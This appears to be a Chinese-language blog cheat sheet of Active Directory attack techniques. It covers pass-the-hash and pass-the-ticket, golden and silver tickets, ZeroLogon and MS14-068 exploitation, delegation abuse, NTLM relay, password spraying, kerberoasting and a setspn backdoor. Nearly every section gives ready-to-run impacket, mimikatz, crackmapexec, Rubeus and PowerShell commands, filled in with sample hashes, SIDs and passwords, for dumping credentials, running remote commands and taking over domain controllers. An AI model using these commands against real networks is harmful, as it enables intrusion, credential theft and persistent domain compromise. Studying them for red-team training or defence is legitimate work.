<h3 id="PTH-amp-PTK"><a href="#PTH-amp-PTK" class="headerlink" title="PTH&amp;PTK"></a>PTH&amp;PTK</h3><p>PTH在kb2871997之后可能会失败。但可以使用机器用户或域用户绕过，机器用户就是域用户。</p>
<h4 id="impacket方式"><a href="#impacket方式" class="headerlink" title="impacket方式"></a>impacket方式</h4><p>这几个脚本的使用参数都是一样的，exe和py都是一样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmiexec.py	动静一般</span><br><span class="line">psexec.py	动静大</span><br><span class="line">dcomexec.py	动静小	</span><br><span class="line">smbexec.py	动静大</span><br><span class="line">atexec.py </span><br></pre></td></tr></table></figure>
<p>有明文密码的情况下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 wmiexec.py administrator:Aa123123.@10.0.2.254</span><br></pre></td></tr></table></figure>
<p>有hash的情况下</p>
<p>工作组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psexec.py -hashes b9466d8c3afe060325ad3b83fa6627c7:379529bb14c7cc48eb314445c3529f49 workgroup&#x2F;administrator@192.168.80.5</span><br></pre></td></tr></table></figure>
<p>域</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 wmiexec.py exp&#x2F;administrator@10.0.2.254 -hashes :b660e61adc0aec1fe34711e6226fcc8c</span><br></pre></td></tr></table></figure>
<p>有ase256的情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 wmiexec.py exp&#x2F;administrator@10.0.2.5 -aesKey a38e70861856e2f4c98134b5288383c7992e63c5031a9540e636d2cafa9e88d6</span><br></pre></td></tr></table></figure>
<h4 id="mimikatz方式-1"><a href="#mimikatz方式-1" class="headerlink" title="mimikatz方式"></a>mimikatz方式</h4><p>ntlm可改为rc4、aes256、aes128</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth &#x2F;user:win10 &#x2F;domain:test.local &#x2F;ntlm:6a6293bc0c56d7b9731e2d5506065e4a</span><br></pre></td></tr></table></figure>
<h4 id="批量方式"><a href="#批量方式" class="headerlink" title="批量方式"></a>批量方式</h4><p>CS、crackmap都可以批量PTH，CS直接点点点就行了</p>
<h5 id="crackmap"><a href="#crackmap" class="headerlink" title="crackmap"></a>crackmap</h5><p>这个工具的思路作用是直接命令执行或传马</p>
<p>SMB服务探测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure>
<p>查看密码策略</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --pass-pol</span><br></pre></td></tr></table></figure>
<p>hashdump</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --sam</span><br></pre></td></tr></table></figure>
<p>枚举组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --local-groups</span><br></pre></td></tr></table></figure>
<p>基于smbexec执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --exec-method smbexec -x &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
<p>基于dcom执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --exec-method mmcexec -x &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
<p>基于atexec执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --exec-method wmiexec -X &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
<p>利用hash传递</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -H &#39;579110c49145015c47ecd267657d3174&#39; --exec-method atexec -x &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
<p>上传文件</p>
<p>默认到C盘，源-目标</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --put-file 1.bin 32.bin</span><br></pre></td></tr></table></figure>
<p>查看电脑的盘符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --disks</span><br></pre></td></tr></table></figure>
<h5 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h5><p>Invoke-WMIexec<br>Invoke-SMBExec</p>
<p>命令格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">执行</span><br><span class="line">Invoke-WMIExec -Target 10.0.2.5 -Domain workgroup -Username uac -Hash 36aa83bdcab3c9fdaf321ca42a31c3fc -Command &quot;calc&quot; -verbose</span><br><span class="line">检查</span><br><span class="line">Invoke-WMIExec -Target 192.168.100.20 -Username administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0</span><br></pre></td></tr></table></figure>
<h5 id="绕过Win32-Process-create的PTH"><a href="#绕过Win32-Process-create的PTH" class="headerlink" title="绕过Win32_Process.create的PTH"></a>绕过Win32_Process.create的PTH</h5><p>360LINTON写的vbs工具，无需445</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">主要功能：1、命令执行；2、文件上传；3、文件下载</span><br><span class="line"></span><br><span class="line">有命令回显执行方式</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs &#x2F;cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo&quot; 1</span><br><span class="line"></span><br><span class="line">无命令回显</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs &#x2F;cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo &gt; c:\1.txt&quot; 0</span><br><span class="line"></span><br><span class="line">模拟shell模式</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs &#x2F;shell 172.16.94.187 administrator &quot;Password!&quot;</span><br><span class="line"></span><br><span class="line">文件上传-复制本机calc.exe到远程主机c:\calc.exe</span><br><span class="line">&gt; cscript wmihacker_0.4.vbe &#x2F;upload 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\windows\system32\calc.exe&quot; &quot;c:\calc&quot;</span><br><span class="line"></span><br><span class="line">文件下载-下载远程主机calc.exe到本地c:\calc.exe</span><br><span class="line">&gt; cscript wmihacker_0.4.vbe &#x2F;download 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\calc&quot; &quot;c:\windows\system32\calc.exe&quot;</span><br></pre></td></tr></table></figure>
<h5 id="使用wmi事件订阅的PTH"><a href="#使用wmi事件订阅的PTH" class="headerlink" title="使用wmi事件订阅的PTH"></a>使用wmi事件订阅的PTH</h5><p>lengyi写的工具</p>
<p>修改js文件中的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Administrator\Desktop&gt; New-WMIShell -Target &#39;192.168.2.115&#39; -Username &#39;administrator&#39; -Password &#39;abc123!&#39; -ProcessName &#39;notepad.exe&#39; -JScriptPath C:\Users\Administrator\Desktop\payload.js -FilterName &#39;sdqwsda&#39; -ConsumerName &#39;sdqwsda&#39;</span><br></pre></td></tr></table></figure>
<h3 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h3><h4 id="票据操作"><a href="#票据操作" class="headerlink" title="票据操作"></a>票据操作</h4><p>cmd方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd:&gt;klist 查看票据</span><br><span class="line">cmd:&gt;klist purge 删除票据</span><br></pre></td></tr></table></figure>
<p>mimikatz方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz # kerberos::purge         &#x2F;&#x2F;清空当前机器中所有凭证</span><br><span class="line">mimikatz # kerberos::list          &#x2F;&#x2F;查看当前机器凭证</span><br><span class="line">mimikatz # kerberos::ptt 票据文件   &#x2F;&#x2F;将票据注入到内存中</span><br></pre></td></tr></table></figure>
<h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><p>制作黄金票据的基础是获取了krbtgt账户的hash。</p>
<p>通过各种办法导出krbtgt的hash，然后制作票据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">制作票据，可以指定&#x2F;rc4、aes256、aes128</span><br><span class="line">kerberos::golden &#x2F;admin:administrator &#x2F;domain:exp.com &#x2F;sid:S-1-5-21-2245962460-1542597299-2684170513 &#x2F;krbtgt:92cdcc6a660c53a1be3d4080ad92efde &#x2F;ticket:admin.tck</span><br><span class="line">注入票据</span><br><span class="line">kerberos::&#x2F;ptt 1.tck</span><br></pre></td></tr></table></figure>
<h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h4><p>白银票据使用机器账户的ntlm hash，使用cifs文件服务，仅能访问特定服务，不限于cifs文件服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::golden &#x2F;domain:test.local &#x2F;sid:S-1-5-21-514356739-3204155868-1239341419 &#x2F;target:dc.test.local &#x2F;service:cifs &#x2F;rc4:9150e40e4ec936a15baf384ca382a3df &#x2F;user:dc$ &#x2F;ptt</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>基于PAC产生的漏洞</p>
<h4 id="windows利用"><a href="#windows利用" class="headerlink" title="windows利用"></a>windows利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MS14-068.exe -u cs@exp.com -s S-1-5-21-2245962460-1542597299-2684170513-1103 -d 10.0.2.254 -p Aa123123.</span><br></pre></td></tr></table></figure>
<h4 id="Linux上利用"><a href="#Linux上利用" class="headerlink" title="Linux上利用"></a>Linux上利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MS14-068.py -u cs@exp.com -s S-1-5-21-2245962460-1542597299-2684170513-1103 -d 10.0.2.254 -p Aa123123.</span><br></pre></td></tr></table></figure>
<p>生成票据后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME&#x3D;xx.krb</span><br><span class="line">psexec.py exp.com&#x2F;cs@dc.exp.com -k -no-pass -debug -dc-ip 10.0.2.254 -target-ip 10.0.2.254</span><br></pre></td></tr></table></figure>
<h4 id="keko利用"><a href="#keko利用" class="headerlink" title="keko利用"></a>keko利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exploit::ms14068 &#x2F;domain:exp.com &#x2F;user:cs &#x2F;password:Aa123123. &#x2F;ptt</span><br></pre></td></tr></table></figure>
<h3 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h3><p>ZeroLogon通过置空DC机器用户的密码来打DC</p>
<h4 id="python利用"><a href="#python利用" class="headerlink" title="python利用"></a>python利用</h4><p>置空DC机器用户密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py WIN-I8E0L339L6E 10.0.2.254</span><br></pre></td></tr></table></figure>
<p>读取DC的hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py exp.com&#x2F;WIN-I8E0L339L6E\$@10.0.2.254 -just-dc -no-pass</span><br></pre></td></tr></table></figure>
<p>PTH，PTK连</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmiexec.py exp&#x2F;administrator@10.0.2.254 -hashes :b660e61adc0aec1fe34711e6226fcc8c</span><br></pre></td></tr></table></figure>
<h4 id="mimikatz利用"><a href="#mimikatz利用" class="headerlink" title="mimikatz利用"></a>mimikatz利用</h4><p>漏洞检测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::zerologon &#x2F;target:WIN-I8E0L339L6E.exp.com &#x2F;account:DC$</span><br></pre></td></tr></table></figure>
<p>置空</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::zerologon &#x2F;target:WIN-I8E0L339L6E.exp.com &#x2F;account:WIN-I8E0L339L6E$ &#x2F;exploit</span><br></pre></td></tr></table></figure>
<p>查看票据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;user:krbtgt &#x2F;domain:exp.com</span><br></pre></td></tr></table></figure>
<p>生成黄金票据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:exp.com &#x2F;dc:WIN-I8E0L339L6E.exp.com &#x2F;user:krbtgt &#x2F;authuser:WIN-I8E0L339L6E$ &#x2F;authdomain:exp &#x2F;authpassword:   &#x2F;authntlm</span><br></pre></td></tr></table></figure>
<p>impacket生成黄金票据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">goldenPac.py test.local&#x2F;jack:123456!@#@WIN-I8E0L339L6E.exp.com</span><br></pre></td></tr></table></figure>
<h4 id="Powershell利用"><a href="#Powershell利用" class="headerlink" title="Powershell利用"></a>Powershell利用</h4><p>Invoke-ZeroLogon.ps1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击</span><br><span class="line">Invoke-ZeroLogon DC.exp.com</span><br></pre></td></tr></table></figure>
<h4 id="恢复域控密码"><a href="#恢复域控密码" class="headerlink" title="恢复域控密码"></a>恢复域控密码</h4><p>读取DC注册表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">get system.save</span><br><span class="line">get sam.save</span><br><span class="line">get security.save</span><br><span class="line">del &#x2F;f system.save</span><br><span class="line">del &#x2F;f sam.save</span><br><span class="line">del &#x2F;f security.save</span><br></pre></td></tr></table></figure>
<p>读原先机器用户HASH</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure>
<p>还原HASH</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 reinstall_original_pw.py WIN-I8E0L339L6E 10.0.2.254 13adade6efd67a927131a3149a7693c4</span><br><span class="line">exp.com&#x2F;WIN-I8E0L339L6E\$@10.0.2.254 -just-dc -no-pass</span><br></pre></td></tr></table></figure>
<h3 id="Kerberos-Bronze-Bit-Attack"><a href="#Kerberos-Bronze-Bit-Attack" class="headerlink" title="Kerberos Bronze Bit Attack"></a>Kerberos Bronze Bit Attack</h3><h4 id="约束委派绕过"><a href="#约束委派绕过" class="headerlink" title="约束委派绕过"></a>约束委派绕过</h4><p>这里思路是找到非约束委派主机S1，再利用账户向DC请求票据，最后拿着票据攻击S2</p>
<p>1）找到配置了非约束的委派的账户和主机</p>
<p>通过命令查找</p>
<p>2）拿下权限<br>3）尝试Kerberos Bronze Bit Attack</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runas &#x2F;user:PC\administrator mimikatz</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br></pre></td></tr></table></figure>
<p>4）请求票据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 getST.py -spn cifs&#x2F;Service2.test.local -impersonate administrator -hashes AAD3B435B51404EEAAD3B435B51404EE:aa09cecb1728cd5cad6e779c7f370563 -aesKey 71f9caf9203575bbbe760e6a669d90cbe39be0b5a442496295e2f63990ee858f exp.com&#x2F;PC -force-forwardable</span><br></pre></td></tr></table></figure>
<p>5）PTT攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME&#x3D;xx.krb</span><br><span class="line">psexec.py exp.com&#x2F;cs@dc.exp.com -k -no-pass PC.exp.com</span><br></pre></td></tr></table></figure>
<h4 id="资源约束委派绕过"><a href="#资源约束委派绕过" class="headerlink" title="资源约束委派绕过"></a>资源约束委派绕过</h4><p>这里思路是先拿下一个S1，然后利用特权新建一个机器账户，再利用Microsoft.ActiveDirectory.Management.dll添加机器用户与S2的信任关系，再模拟机器用户向DC申请票据，最后通过票据登录S2。</p>
<p>1）首先需要通过powermad新加入一个计算机账户AttackerService，密码为AttackerServicePassword，用域账户jack登录service1。</p>
<p>注：这个powermad工具不仅可以通过滥用特权添加机器账户，还可以添加NS解析记录。NS解析记录可用于HTTP的NTLM RELAY。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad\powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString &#39;AttackerServicePassword&#39; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>
<p>2）然后使用PowerShell Active Directory模块添加基于资源的约束委派，即从AttackerService到Service2的传入信任关系。<br>Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后生成，默认只在域控上有，可以从域控上导出。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Get-ADComputer AttackerService #确认机器账户已经被添加</span><br><span class="line">Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$</span><br><span class="line">Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
<p>3）设置好基于资源的约束委派之后就可以模拟用户申请票据了。</p>
<p>hashes和aesKey参数来自于添加的机器用户AttackerService，mimikatz可以计算</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::hash &#x2F;password:AttackerServicePassword &#x2F;user:AttackerService</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 getST.py -spn cifs&#x2F;Service2.test.local -impersonate administrator -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local&#x2F;AttackerService -force-forwardable</span><br></pre></td></tr></table></figure>
<p>4）PTT攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME&#x3D;xx.krb</span><br><span class="line">psexec.py exp.com&#x2F;cs@dc.exp.com -k -no-pass PC.exp.com</span><br></pre></td></tr></table></figure>
<h3 id="MS16-075"><a href="#MS16-075" class="headerlink" title="MS16-075"></a>MS16-075</h3><p>potato系列，通过http协议relay，再反射回给本机的smb协议。用作提权</p>
<h3 id="CVE-2018-8581"><a href="#CVE-2018-8581" class="headerlink" title="CVE-2018-8581"></a>CVE-2018-8581</h3><p>exchange ssrf漏洞</p>
<p>1）使用impacket监听端口进行等待连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntlmrelayx.py -t ldap:&#x2F;&#x2F;10.0.2.254 --no-dump -no-da -escalate-user cs</span><br></pre></td></tr></table></figure>
<p>2）发起推送订阅指定所需的URL，Exchange 服务器将尝试向这个URL发送通知</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privexchange.py -ah 10.0.2.4 owa2010sp3.exp.com -u sqladmin -p 123456 -d exp -ev 2010_SP1</span><br></pre></td></tr></table></figure>
<p>3）relay到域控的ldap服务器会自动给普通用户添加两台ACL</p>
<p>4）dcync</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secretdump.py exp.com&#x2F;cs:123456@OWA2010SP3.exp.com -dc-ip 10.0.2.253 -just-dc-user administrator</span><br></pre></td></tr></table></figure>
<h3 id="CVE-2019-1040"><a href="#CVE-2019-1040" class="headerlink" title="CVE-2019-1040"></a>CVE-2019-1040</h3><p>smb需要签名的MIC防护绕过</p>
<h4 id="域控打法"><a href="#域控打法" class="headerlink" title="域控打法"></a>域控打法</h4><p>1）域控打法<br>使用impacket监听445进行等待域控进行连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntlmrelayx.py -t ldap:&#x2F;&#x2F;1.1.1.1 --escalate-user win7\$ --remove-mic --no-dump -smb2support</span><br></pre></td></tr></table></figure>
<p>使用打印机漏洞让域控连接我们的445(注意攻击的域控跟回连的LDAP所在的服务器不要在同一台域控)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">printerbug.py exp.com&#x2F;cs:123456@10.0.2.4 10.0.2.5</span><br></pre></td></tr></table></figure>
<p>发起win7$到dc2012的s4u，通过-impersonate参数模拟用户administrator的票证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getST.py exp.com&#x2F;win7\$ -dc-ip 10.0.2.254 -spn cifs&#x2F;dc2012r2.exp.com -hashes xxxx</span><br><span class="line">-impersonate administrator</span><br></pre></td></tr></table></figure>
<p>使用administrator用户的票据登录域控psexec，导入凭证</p>
<p>2）exchange打法</p>
<p>暂无</p>
<h3 id="CVE-2019-1384"><a href="#CVE-2019-1384" class="headerlink" title="CVE-2019-1384"></a>CVE-2019-1384</h3><p>这个是绕过MS08-068，通过超时发送type3</p>
<p><a href="https://shenaniganslabs.io/files/impacket-ghostpotato.zip">https://shenaniganslabs.io/files/impacket-ghostpotato.zip</a></p>
<h2 id="协议缺陷利用"><a href="#协议缺陷利用" class="headerlink" title="协议缺陷利用"></a>协议缺陷利用</h2><h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><p>使用DomainPasswordSpray.ps1</p>
<p><a href="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="built_in">Import-Module</span> DomainPasswordSpray.ps1</span><br><span class="line"><span class="comment">#枚举用户输出成txt</span></span><br><span class="line"><span class="built_in">Get-DomainUserList</span> | <span class="built_in">Out-File</span> <span class="literal">-Encoding</span> ascii userlist.txt</span><br><span class="line"><span class="comment">#喷洒</span></span><br><span class="line"><span class="built_in">Invoke-DomainPasswordSpray</span> <span class="literal">-UserList</span> users.txt <span class="literal">-Domain</span> exp.com <span class="literal">-PasswordList</span> passlist.txt <span class="literal">-OutFile</span> sprayed<span class="literal">-creds</span>.txt</span><br></pre></td></tr></table></figure>
<h3 id="AS-REPRoasting"><a href="#AS-REPRoasting" class="headerlink" title="AS-REPRoasting"></a>AS-REPRoasting</h3><p>如果存在设置了选项不需要kerberos预身份验证的用户，可以直接攻击</p>
<p>查找具有此属性的用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose</span><br></pre></td></tr></table></figure>
<p>发包且监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asreproast</span><br><span class="line">对于要打非域内的机器通过指定dc的参数即可</span><br><span class="line">Rubeus.exe asreproast &#x2F;dc:xxx</span><br></pre></td></tr></table></figure>
<h3 id="GPP利用"><a href="#GPP利用" class="headerlink" title="GPP利用"></a>GPP利用</h3><p>读取组策略文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir &#x2F;s &#x2F;a \\DC.exp.com\SYSVOL\exp.com\*.xml</span><br><span class="line">powershell  import-modulo  .\Get-GPPpassword.ps1;Get-GppPassword</span><br></pre></td></tr></table></figure>
<h3 id="kerberoasting"><a href="#kerberoasting" class="headerlink" title="kerberoasting"></a>kerberoasting</h3><p>其原理在于先用LDAP查询于域的spn，再通过发送TGS包，提取拼接得到hashcat或者john能爆破的格式。</p>
<p>rubeus攻击直接一键化了。</p>
<p>发包并监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rubeus.exe kerberoast</span><br></pre></td></tr></table></figure>
<p>kirbi票据破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python tgsrepcrack.py mima.txt 123.kirbi</span><br></pre></td></tr></table></figure>
<p>留后门</p>
<p>给管理员注册一个UNC的服务留后门，随时可以拿读管理员kirbi</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn -U -A UNC&#x2F;dc.exp.com administrator</span><br></pre></td></tr></table></figure>
<h3 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h3><p>在adsiedit.msc可以打开ADSI编辑器链接LDAP</p>
<h4 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h4><p>1.找到配置了非约束的委派的机器账户（使用命令）<br>2.拿下权限<br>3.监听来自DC的访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe monitor &#x2F;interval:1 &#x2F;filteruser:dc$</span><br></pre></td></tr></table></figure>
<p>4.得到域控的票据<br>a.打印机漏洞<br>b.其他UNC方式，需要域管交互<br>5.导入base64的ticket</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\Rubeus.exe ptt &#x2F;ticket:base64</span><br></pre></td></tr></table></figure>
<p>mimikatz导出票据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets &#x2F;export</span><br></pre></td></tr></table></figure>
<p>还可通过powershell写成票据文件，可以用rubeus直接导出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[IO.File]::WriteAllBytes(&quot;ticket.kirbi&quot;, [Convert]::FromBase64String(&quot;Y21kIC9jIG5ldCB1c2VyIGJ5cGFzc3VhYyAxMjM0NTYgL2FkZA&#x3D;&#x3D;&quot;))</span><br></pre></td></tr></table></figure>
<p>PTT</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::ptt 1.kirbi</span><br><span class="line">lsadump::dcsync &#x2F;domain:test.local &#x2F;all &#x2F;csv</span><br></pre></td></tr></table></figure>
<h4 id="约束委派攻击-1"><a href="#约束委派攻击-1" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h4><p>DC上配置委派用户，用来处理其他用户对DC上特定服务的访问请求</p>
<p>DC上配置委派主机，用来处理其他用户对DC上特定服务的访问请求</p>
<p>1.找到配置了非约束的委派的账户和主机</p>
<p>2.拿下权限</p>
<p>3.基于委派服务用户向服务器请求TGT</p>
<p>使用keko冒充委派服务用户请求TGT，密码明文，hash，aes加密都行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tgt::ask &#x2F;user:cs &#x2F;domain:exp.com &#x2F;password:password</span><br><span class="line">tgt::ask &#x2F;user:cs &#x2F;domain:exp.com &#x2F;NTLM:b4f27a13d0f78d5ad83750095ef2d8ec</span><br></pre></td></tr></table></figure>
<p>4.通过s4u伪造<a href="mailto:&#97;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#116;&#x72;&#97;&#116;&#x6f;&#x72;&#x40;&#x65;&#120;&#112;&#x2e;&#x63;&#111;&#109;&#105;&#x66;&#x73;">&#97;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#116;&#x72;&#97;&#116;&#x6f;&#x72;&#x40;&#x65;&#120;&#112;&#x2e;&#x63;&#111;&#109;&#105;&#x66;&#x73;</a>服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tgs::s4u &#x2F;tgt:1.kirbi &#x2F;user:administrator &#x2F;service:cifs&#x2F;dc.test.local</span><br></pre></td></tr></table></figure>
<p>S4U2Self获取到的ST1以及S4U2Proxy获取到的dm08 CIFS服务的ST2会保存在当前目录下</p>
<p>5.PTT</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::ptt administrator@cifs.kirbi</span><br></pre></td></tr></table></figure>
<h4 id="资源约束委派攻击"><a href="#资源约束委派攻击" class="headerlink" title="资源约束委派攻击"></a>资源约束委派攻击</h4><p>适用2012 R2和Windows Server 2012及以上</p>
<p>暂无</p>
<h3 id="NTML-RELAY攻击"><a href="#NTML-RELAY攻击" class="headerlink" title="NTML RELAY攻击"></a>NTML RELAY攻击</h3><p>NTLM协议是加载在smb、http、ldap等协议上的，relay攻击的过程就是中间人攻击的过程。主要用于域内攻击。</p>
<p>v1版本的NET NTLM拿到相当于拿到hash，使用<a href="https://crack.sh/get-cracking/">这里</a>破解NET NTLMv1不需要RELAY，不过v1版本在win7/server2008之后就不适用了，之后的版本都是v2，v2的攻击方式主要是relay。</p>
<p>v2的破解使用hashcat</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600  win10::TEST:1122334455667788:622DED0816CFF5A0652209F20A7CF17A:0101000000000000C0653150DE09D201532C07A7DEE654B8000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000010000000020000067840C88904F15E659858A3CBA35EBEF61A38EC88C5E3D26B968F1C20C9ACAC10A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E003100300030002E0031000000000000000000 &#x2F;tmp&#x2F;password.dic --force</span><br></pre></td></tr></table></figure>
<p>以下分三种不同协议的利用方式进行说明。</p>
<p>responder工具发起监听<a href="https://github.com/lgandx/Responder%EF%BC%8C%E4%BD%86%E4%B8%8D%E8%83%BD%E4%B8%AD%E7%BB%A7">https://github.com/lgandx/Responder，但不能中继</a></p>
